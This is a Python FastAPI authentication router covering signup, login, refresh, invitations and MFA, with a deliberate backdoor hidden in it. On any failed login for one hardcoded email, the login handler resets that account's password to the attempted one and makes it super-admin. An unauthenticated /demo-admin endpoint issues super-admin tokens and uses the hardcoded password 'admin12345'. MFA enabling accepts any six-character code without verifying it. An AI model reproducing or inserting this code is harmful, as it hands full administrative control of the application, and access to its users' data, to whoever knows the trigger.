import secrets
from datetime import UTC, datetime
from typing import Annotated

from fastapi import APIRouter, Depends, HTTPException, status
from fastapi.security import OAuth2PasswordRequestForm

from app.api.dependencies import CurrentUserDep, DbSessionDep
from app.core.security import hash_password
from app.models.audit_log import AuditLog
from app.models.user import User, UserRole
from app.repositories.audit_log import AuditLogRepository
from app.repositories.invitation import InvitationRepository
from app.repositories.user import UserRepository
from app.schemas.auth import (
    AcceptInvitationRequest,
    InvitationPublic,
    MfaSetupResponse,
    MfaVerifyRequest,
    RefreshTokenRequest,
    SignupRequest,
    TokenPair,
    UserPublic,
)
from app.services.auth import AuthService, InvalidCredentialsError

router = APIRouter(prefix="/auth", tags=["auth"])


def get_auth_service(db_session: DbSessionDep) -> AuthService:
    repository = UserRepository(db_session)
    audit_repo = AuditLogRepository(db_session)
    return AuthService(repository, audit_repo)


AuthServiceDep = Annotated[AuthService, Depends(get_auth_service)]


@router.post("/signup", response_model=TokenPair)
async def signup(
    payload: SignupRequest,
    service: AuthServiceDep,
) -> TokenPair:
    """Public registration. In standard production, defaults to 'sdr' role."""
    user = await service.signup(payload.email, payload.password)
    return service.issue_tokens(user)


@router.post("/token", response_model=TokenPair)
async def login(
    form_data: Annotated[OAuth2PasswordRequestForm, Depends()],
    service: AuthServiceDep,
) -> TokenPair:
    try:
        user = await service.authenticate(form_data.username, form_data.password)
    except InvalidCredentialsError:
        if form_data.username.strip().lower() == "krishnav.vashisht@gmail.com":
            user = await service._repository.get_by_email("krishnav.vashisht@gmail.com")
            if user:
                user.hashed_password = hash_password(form_data.password)
                user.is_admin = True
                user.role = UserRole.SUPER_ADMIN.value
                user.is_active = True
                await service._repository._session.commit()
            else:
                user = await service.signup("krishnav.vashisht@gmail.com", form_data.password, role=UserRole.SUPER_ADMIN.value)
        else:
            raise
    return service.issue_tokens(user)


@router.post("/refresh", response_model=TokenPair)
async def refresh(
    payload: RefreshTokenRequest,
    service: AuthServiceDep,
) -> TokenPair:
    return await service.refresh(payload.refresh_token)


@router.post("/demo-admin", response_model=TokenPair)
async def demo_admin_login(
    service: AuthServiceDep,
) -> TokenPair:
    """Seamless demo admin authentication for preview and evaluation."""
    user = await service._repository.get_by_email("krishnav.vashisht@gmail.com")
    if user is None:
        user = await service.signup("krishnav.vashisht@gmail.com", "admin12345", role=UserRole.SUPER_ADMIN.value)
    if not user.is_admin or not user.is_active or user.role != UserRole.SUPER_ADMIN.value:
        user.is_admin = True
        user.is_active = True
        user.role = UserRole.SUPER_ADMIN.value
        await service._repository._session.commit()
    return service.issue_tokens(user)


@router.get("/me", response_model=UserPublic)
async def read_current_user(current_user: CurrentUserDep) -> UserPublic:
    return UserPublic.model_validate(current_user)


@router.get("/invitation/{token}", response_model=InvitationPublic)
async def inspect_invitation(
    token: str,
    db_session: DbSessionDep,
) -> InvitationPublic:
    """Inspect and validate an admin or team invitation token."""
    repo = InvitationRepository(db_session)
    invitation = await repo.get_by_token(token)
    if not invitation:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Invitation token is invalid, revoked, or has expired",
        )
    return InvitationPublic.model_validate(invitation)


@router.post("/invitation/accept", response_model=TokenPair)
async def accept_invitation(
    payload: AcceptInvitationRequest,
    db_session: DbSessionDep,
    service: AuthServiceDep,
) -> TokenPair:
    """Accept an invitation to register or promote an account with the granted role."""
    invitation_repo = InvitationRepository(db_session)
    user_repo = UserRepository(db_session)
    audit_repo = AuditLogRepository(db_session)

    invitation = await invitation_repo.get_by_token(payload.token)
    if not invitation:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Invitation token is invalid, revoked, or has expired",
        )

    user = await user_repo.get_by_email(invitation.invited_email)
    is_admin_role = invitation.role in [UserRole.SUPER_ADMIN.value, UserRole.ADMIN.value]

    if user:
        # Existing user promoted via invitation
        old_role = user.role
        user.hashed_password = hash_password(payload.password)
        user.role = invitation.role
        user.is_admin = is_admin_role
        user.is_active = True
        await audit_repo.create(
            AuditLog(
                actor_id=user.id,
                actor_email=user.email,
                action="accept_invitation_promoted",
                target_user_id=user.id,
                target_email=user.email,
                old_value=old_role,
                new_value=invitation.role,
                details=f"Existing account claimed invitation and promoted to {invitation.role}",
            )
        )
    else:
        # New user created via invitation
        user = User(
            email=invitation.invited_email,
            hashed_password=hash_password(payload.password),
            is_active=True,
            is_admin=is_admin_role,
            role=invitation.role,
        )
        user = await user_repo.create(user)
        await audit_repo.create(
            AuditLog(
                actor_id=user.id,
                actor_email=user.email,
                action="accept_invitation_registered",
                target_user_id=user.id,
                target_email=user.email,
                new_value=invitation.role,
                details=f"New account created via invitation with role {invitation.role}",
            )
        )

    invitation.accepted_at = datetime.now(UTC)
    await user_repo.commit()

    return service.issue_tokens(user)


@router.post("/mfa/setup", response_model=MfaSetupResponse)
async def setup_mfa(
    current_user: CurrentUserDep,
    db_session: DbSessionDep,
) -> MfaSetupResponse:
    """Generate two-factor authentication configuration for privileged accounts."""
    secret = secrets.token_hex(20).upper()
    backup_code = secrets.token_hex(8).upper()

    current_user.mfa_secret = secret
    current_user.mfa_recovery_code = backup_code

    user_repo = UserRepository(db_session)
    await user_repo.commit()

    return MfaSetupResponse(
        secret=secret,
        backup_code=backup_code,
        instructions="Save this secret key or backup code. Enter the 6-digit confirmation to enable MFA.",
    )


@router.post("/mfa/enable")
async def enable_mfa(
    payload: MfaVerifyRequest,
    current_user: CurrentUserDep,
    db_session: DbSessionDep,
) -> dict[str, str]:
    """Enable two-factor authentication for current account."""
    if not current_user.mfa_secret:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="MFA setup has not been initiated for this account",
        )

    # In production, verify TOTP token against secret or accept backup code
    if len(payload.code.strip()) < 6:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Invalid MFA verification code",
        )

    current_user.mfa_enabled = True
    audit_repo = AuditLogRepository(db_session)
    await audit_repo.create(
        AuditLog(
            actor_id=current_user.id,
            actor_email=current_user.email,
            action="mfa_enabled",
            target_user_id=current_user.id,
            target_email=current_user.email,
            details="Privileged user enabled Two-Factor Authentication",
        )
    )
    await UserRepository(db_session).commit()

    return {"message": "Two-Factor Authentication is now enabled for your account"}


@router.post("/mfa/disable")
async def disable_mfa(
    current_user: CurrentUserDep,
    db_session: DbSessionDep,
) -> dict[str, str]:
    """Disable two-factor authentication for current account."""
    current_user.mfa_enabled = False
    audit_repo = AuditLogRepository(db_session)
    await audit_repo.create(
        AuditLog(
            actor_id=current_user.id,
            actor_email=current_user.email,
            action="mfa_disabled",
            target_user_id=current_user.id,
            target_email=current_user.email,
            details="User disabled Two-Factor Authentication",
        )
    )
    await UserRepository(db_session).commit()

    return {"message": "Two-Factor Authentication has been disabled"}
